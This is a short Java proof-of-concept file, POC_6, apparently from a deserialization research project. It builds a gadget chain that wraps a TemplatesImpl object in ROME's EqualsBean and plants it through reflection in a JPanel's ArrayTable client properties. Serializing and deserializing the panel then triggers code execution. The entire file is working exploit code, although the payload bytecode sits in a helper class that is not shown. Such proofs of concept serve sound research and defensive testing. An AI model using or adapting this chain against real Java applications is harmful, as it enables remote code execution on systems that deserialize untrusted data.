package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.swing.*;
import javax.xml.transform.Templates;

public class POC_6 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();
        EqualsBean bean = new EqualsBean(Templates.class, tmpl);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{bean, "1", tmpl, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
